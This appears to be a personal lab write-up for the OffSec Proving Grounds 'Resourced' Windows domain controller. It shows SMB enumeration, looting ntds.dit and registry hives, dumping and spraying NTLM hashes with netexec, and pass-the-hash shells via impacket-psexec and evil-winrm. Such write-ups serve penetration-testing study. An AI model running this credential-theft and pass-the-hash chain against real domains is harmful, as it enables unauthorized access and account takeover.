...
```
SMB         192.168.230.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
```
...
As Guest (without password)?

```
smbclient -U 'Guest' -L \\$IP
```

Also unsuccessful -- NT_STATUS_ACCOUNT_DISABLED, so we can't use it anywhere else like RDP either.

At this point, I realized that I totally overlooked credentials for v.ventz in [[135 MSRPC]]!
> Description :   New-hired, reminder: HotelCalifornia194!

(Added to findings in [[Archive/OFFSEC - Proving Grounds Writeups/Windows/Resourced/index|index]])
# Using V.Ventz credentials
Signing in as v.ventz:
`smbclient -U 'resourced.local/v.ventz' -L "//ResourceDC.resourced.local/"`
...
do_connect: Connection to ResourceDC.resourced.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Reconnect and browse shares:

`smbclient -U 'resourced.local/v.ventz' --password=HotelCalifornia194! '//ResourceDC.resourced.local/Password Audit'`

Password Audit sounds promising and contains two directories, 'Active Directory' and 'Registry'.

'Active Directory' has ntds.dit, which is the database file which holds all authentication information for an active directory domain. This is a great finding for us.

![[Pasted image 20250808100927.png]]

We also have the SECURITY and SYSTEM hives under the Registry Directory. I'll download these as well.
*When re-attempting to download SYSTEM on a subsequent solve, I encountered timeout issues, since it's a much larer file than SECURITY. I fixed this by setting a higher timeout like -t 600:*
![[Pasted image 20250811193436.png]]

To extract useful secrets from the database, we can use ntds.dit, SYSTEM, and SECURITY together back on our attacking system.
...
Let's try accessing SMB as v.ventz again, this time using their hash:

`netexec smb ResourceDC.resourced.local -u 'v.ventz' -H '913c144caea1c0a936fd1ccb46929d3c' --shares`

```
SMB         192.168.215.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         192.168.215.175 445    RESOURCEDC       [+] resourced.local\v.ventz:913c144caea1c0a936fd1ccb46929d3c
SMB         192.168.215.175 445    RESOURCEDC       [*] Enumerated shares
SMB         192.168.215.175 445    RESOURCEDC       Share           Permissions     Remark
SMB         192.168.215.175 445    RESOURCEDC       -----           -----------     ------
SMB         192.168.215.175 445    RESOURCEDC       ADMIN$                          Remote Admin
...
```
...
Can we get in as admin?

`impacket-psexec RESOURCED.LOCAL/Administrator@$IP -hashes :12579b1666d4ac10f0f59f300776495f`
...
Unusual for Administrator to not have remote access. Lets enumerate all.
Make secretsdump.txt from output by removing everything except for NTLM hash entries:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
...
Then create separate user and hashe files:
`awk -F: '/^[^#]/ {print $1 > "users.txt"; print $4 > "hashes.txt"}' secretsdump.txt`

Finally, spray to see which credential gives accesss:
`netexec smb 192.168.215.175 -u users.txt -H hashes.txt --continue-on-success`

We get L.Livingstone with 19a3a7550ce8c505c2d46b5e39d6f808:

![[Pasted image 20250811204105.png]]

We also see V.Ventz with 913c144caea1c0a936fd1ccb46929d3c as confirmed earlier:

![[Pasted image 20250811204138.png]]

Can we get a shell with either of these?

Not for V.Ventz:

`evil-winrm -i ResourceDC.resourced.local -u 'V.Ventz' -H '913c144caea1c0a936fd1ccb46929d3c'`

![[Pasted image 20250811205035.png]]

Yes for L.Livingstone!!!

`evil-winrm -i ResourceDC.resourced.local -u 'L.Livingstone' -H '19a3a7550ce8c505c2d46b5e39d6f808'`

![[Pasted image 20250811205200.png]]

# Continue: [[Local Privilege Escalation|privilege escalation]].
